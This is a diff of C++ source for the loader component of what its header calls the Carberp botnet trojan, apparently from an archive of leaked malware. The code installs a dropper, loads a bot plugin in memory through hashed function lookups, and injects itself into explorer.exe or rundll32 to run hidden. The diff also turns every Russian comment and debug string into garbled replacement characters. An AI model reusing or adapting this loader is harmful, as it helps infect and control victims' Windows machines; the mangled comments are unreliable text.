@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ShlObj.h>
 
@@ -15,7 +26,7 @@ namespace DROPPERDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define DRPDBG DROPPERDEBUGSTRINGS::DBGOutMessage<>
 
 //---------------------------------------------------------------------------
@@ -26,8 +37,8 @@ namespace DROPPERDEBUGSTRINGS
 
 
 
-char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
-DWORD DropperPID = 0;         // PID дропера бота
+char  DropperName[MAX_PATH];  // пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+DWORD DropperPID = 0;         // PID пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 
 typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
@@ -35,7 +46,7 @@ TSetBotParameter SetParam;
 
 
 //---------------------------------------------
-// Функция рельной установки значения параметра
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------
 bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
 {
@@ -46,16 +57,16 @@ bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
 }
 
 //---------------------------------------------
-// Функция инициализирует параметры плагина
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------
 bool SetBotPlugParams(LPVOID Handle)
 {
-	// Получаем функцию установки параметра
-	DRPDBG("_BOT_LOADER", "Устанавливаем параметры bot.plug");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bot.plug");
 	SetParam = (TSetBotParameter)MemoryGetProcAddress(Handle, 0xA336A349 /* SetBotParameter */);
 	if (!SetParam) return false;
 
-	const DWORD BufSize = MAX_MAINHOSTS_BUF_SIZE * 2; // Буфер резервируем с запасом
+	const DWORD BufSize = MAX_MAINHOSTS_BUF_SIZE * 2; // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char Buf[BufSize];
 
 	bool Result = DoSetParam(Buf, BufSize, BOT_PARAM_PREFIX) &&
@@ -67,25 +78,25 @@ bool SetBotPlugParams(LPVOID Handle)
 
 
 //---------------------------------------------
-//  Функция запускает плагин
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------
 void StartBotPlug(LPVOID Handle)
 {
-	DRPDBG("_BOT_LOADER", "Стартуем bot.plug");
+	DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bot.plug");
 	if (Handle)
 	{
 		typedef void (WINAPI *TStart)(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin);
 		TStart Start = (TStart)MemoryGetProcAddress(Handle, 0x3E987971 /* Start */);
 		if (Start)
 		{
-			// Инициализируем плагин
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			Start(TRUE, FALSE, TRUE);
-			// Устанавливаем параметры
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			SetBotPlugParams(Handle);
-			// Стартуем плаин
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			Start(FALSE, TRUE, TRUE);
 
-			DRPDBG("_BOT_LOADER", "Плагин запущен");
+			DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		}
 	} 
 }
@@ -94,31 +105,31 @@ void StartBotPlug(LPVOID Handle)
 
 
 //---------------------------------------------------------------------
-//  Функция загрузки плагина
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------
 DWORD WINAPI DropperMainProc(LPVOID)
 {
 
 	BOT::Initialize();
-	DRPDBG("_BOT_LOADER", "Запущена основная функция лоадера. Процесс: \r\n%s", Bot->ApplicationName().t_str());
+	DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: \r\n%s", Bot->ApplicationName().t_str());
 
-	// Запускаем систему информирования о повторном запуске
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BOT::TryCreateBotInstance();
-	// Инсталируем ладер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	Install(DropperName, FALSE, TRUE, DropperPID);  
 
-	// Стартуем плагин
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	LPVOID Plugin;
 	if (LoadBotPlug(&Plugin, NULL))
 	{
-		DRPDBG("_BOT_LOADER", "bot.plug успешо загружен");
+		DRPDBG("_BOT_LOADER", "bot.plug пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		LPVOID Handle = MemoryLoadLibrary(Plugin,  false);
 		StartBotPlug(Handle);
 		bool InExplorer = File::GetNameHashA(Bot->ApplicationName().t_str(),  true) == 0x490A0972 /* explorer.exe */;
 		if (!InExplorer)
 		{
-			// Если не удалось заинжектиться в эксплорер стартуем инжектор
-			DRPDBG("_BOT_LOADER", "Стартуем инжектор");
+			// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			typedef BOOL (WINAPI *TStartInjector)();
 			TStartInjector StartInjector  = (TStartInjector)MemoryGetProcAddress(Handle, 0x2DD014DD /* StartInjector */);
 			if (StartInjector) 
@@ -132,10 +143,10 @@ DWORD WINAPI DropperMainProc(LPVOID)
 
 //---------------------------------------------------
 //  StartMainFunc
-//  Промежуточная функция запуска основного процесса
-//  загрузчика в свхосте
-//  предназначено для запуска через доверенный 
-//  процесс
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 DWORD WINAPI StartMainFunc(LPVOID)
 {
@@ -162,7 +173,7 @@ BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param)
 }
 */
 //---------------------------------------------------------------------
-//  Основная функция txe  
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ txe  
 //---------------------------------------------------------------------
 int APIENTRY LoaderMain() 
 {
@@ -170,7 +181,7 @@ int APIENTRY LoaderMain()
 //	ShellExecuteA(0, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
 //	ExitProcess(0);
 
-	// Получаем имя дропера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 //	EnumWindows(WndEnumCallBak, NULL);
 //	ExitProcess(0);
@@ -179,7 +190,7 @@ int APIENTRY LoaderMain()
 
 	if (!BOT::IsRunning())
 	{
-		DRPDBG("_BOT_LOADER", "Запускается загрузчик бота");
+		DRPDBG("_BOT_LOADER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 		DropperPID = GetCurrentProcessId();
 		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
 
@@ -188,7 +199,7 @@ int APIENTRY LoaderMain()
 			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
 		if (!InExplorer)
 		{
-			// Инжект не удался, запускаем основную функцию через свхост
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			string ExeName = GetSpecialFolderPathA(CSIDL_SYSTEM, "rundll32.exe");
 			if (!InjecIntoProcessByNameA(ExeName.t_str(), NULL, StartMainFunc))
 				MegaJump(DropperMainProc);
